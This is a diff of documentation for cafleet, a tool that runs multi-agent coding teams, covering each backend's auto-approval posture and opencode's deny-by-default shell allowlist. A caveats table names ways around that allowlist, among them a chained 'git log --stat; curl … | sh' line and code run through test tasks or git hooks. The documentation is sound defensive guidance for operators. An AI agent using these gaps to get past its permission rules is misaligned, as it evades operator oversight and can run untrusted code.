@@ -13,12 +13,12 @@ version/config requirements.
 |---|---|
 | `claude` | `claude --permission-mode dontAsk --prompt-suggestions false --allowedTools <rule>... --name <member-name> <prompt>` |
 | `codex` | `codex --ask-for-approval never --sandbox workspace-write <prompt>` |
-| `opencode` | `opencode --agent cafleet --prompt <prompt>` |
+| `opencode` | `opencode mini --standalone --agent cafleet --prompt <prompt>` |
 
 Shared contract:
 
-- All three postures enable the Bash tool with no runtime permission prompts.
-- All three honor the leading-`!` shell shortcut that
+- Each posture enables shell commands with no runtime permission prompts.
+- Each backend honors the leading-`!` shell shortcut that
   [`cafleet member exec`](cli-options.md#member-exec) dispatches through.
 - Every member can run its broker commands from the moment it is spawned:
   claude through [spawn-time allow rules](#spawn-time-allow-rules), codex
@@ -67,7 +67,7 @@ Per-backend capabilities:
 
 A separate evaluator checks the session condition against the transcript; native background work defers evaluation and returns a host result. Use one native Monitor task for Director inbox records, retaining its handle across separate events and renewing after observed source-task exit. The installed CAFleet skill's Claude native instructions own discovery, invocation, renewal and evidence limits; the [manual lifecycle](../how-to/mixed-backend-team.md#manual-lifecycle) explains operation. Preserve supplied `/goal` state and pending user decisions; manual finite reception remains available when Monitor is unavailable or denied.
 
-Native composer controls act at the beginning of submitted input. A local probe merged control text into a concurrent preview, so serialize complete input and inspect capture evidence. Native shell probes displayed command/stdout/stderr followed by a model turn; the trigger and any second permission check were not established. The Director authorizes each routed command under its host rules.
+Native shell probes displayed command/stdout/stderr followed by a model turn; the trigger and any second permission check were not established. The Director authorizes each routed command under its host rules.
 
 `--permission-mode dontAsk` is the reference auto-approval posture the other
 backends match. A member runs four kinds of call without a prompt: its
@@ -269,11 +269,11 @@ of these rules, so they add nothing when it is also present.
 
 ## Opencode {#opencode}
 
-OpenCode members perform supplied assignments with their selected provider/model, workspace reads/edits, permitted tools and broker communication. The Director coordinates next steps and routed native shell commands. The TUI documents leading `!` input and conversation-visible output; an actual OpenCode native-input permission probe was outside the investigation. Preserve the preset's member-tool permissions and the Director's command authorization.
+OpenCode members perform supplied assignments with their selected provider/model, workspace reads/edits, permitted tools and broker communication. The Director coordinates next steps and routed native shell commands. Leading-`!` input runs a native shell command in `mini`. The native path's effective permission boundary and any second member-tool permission check remain unestablished; preserve the preset's member-tool permissions and the Director's command authorization.
 
-The pane runs the bare `opencode` TUI (not `opencode run`), so it stays a
-long-lived, observable pane like the other backends. The prompt is passed via
-`--prompt` — bare `opencode`'s positional is a project path, not a message.
+The pane runs `opencode mini --standalone`, the long-lived minimal interactive
+interface with a private server per pane. The prompt travels through `--prompt`
+because `mini` takes no positional message.
 
 ### The `cafleet` agent preset {#cafleet-agent-preset}
 
@@ -289,14 +289,18 @@ so `cafleet member create --coding-agent opencode` fails with `opencode agent
 preset not found at <preset>; run 'cafleet setup --coding-agent opencode'
 first` when the file is missing.
 
-The preset's `bash` ruleset is deny-by-default: a `"*": "deny"` base first,
+Preset discovery includes the relocated directory and default home configuration.
+Agent definitions with the same name can merge across those sources; inspect the
+effective configuration when customizing a preset.
+
+The preset's `shell` ruleset is deny-by-default: a `"*": "deny"` base first,
 then an explicit allowlist translated from the operator's Claude Code
 `permissions.allow` set (`cafleet *`, its declared Git commands,
 file-inspection utilities, and the project's cargo-backed mise tasks). opencode selects the
 **last** matching rule, so this order is the safety floor — every check
 resolves to `allow` or `deny`, never `ask`. Explicit `cafleet member prompt *` and `cafleet member exec *` deny
 entries follow the `cafleet *` allow, so they win: the preset configures
-members, and dispatching a command into another pane is the Director's act. Tool permission and assignment authority are separate: the assigned role and Director instructions determine which allowed operations a member may perform. A permission popup in an opencode pane is
+members, and dispatching a command into another pane is the Director's act. A member's denied command receives no permission prompt, while permitted broker commands run normally. Tool permission and assignment authority are separate: the assigned role and Director instructions determine which allowed operations a member may perform. A permission popup in an opencode pane is
 therefore a regression escape, not a runtime decision: capture the pane,
 escalate, and extend the allowlist by operator decision — do not answer the
 popup ad hoc.
@@ -304,18 +308,19 @@ popup ad hoc.
 ### Safety-floor caveats {#safety-floor-caveats}
 
 The posture is a deny-by-default allowlist, with no OS-level sandbox.
-Standalone un-enumerated commands fall to the `"*": "deny"` base, but three
-classes of bypass under allowed globs persist:
+Standalone un-enumerated commands fall to the `"*": "deny"` base. Apply these
+limits when choosing tools and authorizing commands:
 
-| Bypass class | Example | Why the allowlist misses it |
+| Surface | Example | Usage limit |
 |---|---|---|
-| MCP-contributed tools | — | They bypass the permission evaluator entirely |
-| Shell chaining or argument-space abuse inside an allowed `cmd *` match | <code>git log --stat; curl … &#124; sh</code> matching `git log *` | The compound line's leading tokens match the allowed glob |
-| Interpreter or hook execution via allowed tooling | `mise //cafleet:test *` executes workspace-writable test code; `git commit *` runs `.git/hooks` | The allowed command is itself the execution vector |
+| MCP-contributed tools | — | Their participation in preset permission evaluation is unverified on opencode 2.1.4. Keep loaded configurations free of MCP servers. |
+| Compound shell commands | <code>git log --stat; curl … &#124; sh</code> | Permission matching for compound lines is unverified on opencode 2.1.4. Submit one command per invocation and authorize each actual command. |
+| Interpreter or hook execution via allowed tooling | `mise //cafleet:test *` executes workspace-writable test code; `git commit *` runs `.git/hooks` | Authorize the code and hooks that an allowed command can execute. |
 
-cafleet ships no MCP stanzas, and operators MUST NOT add MCP servers to any
-opencode config their machine loads.
+cafleet ships no MCP stanzas. Operators MUST keep every loaded opencode
+configuration free of MCP servers.
 
 For kernel-enforced isolation, use the `codex` backend.
 
-Validated against `opencode 1.15.5` (the minimum supported version).
+Spawn, preset loading, broker input and native shell input are validated against
+opencode 2.1.4; opencode 2 is the minimum supported version.
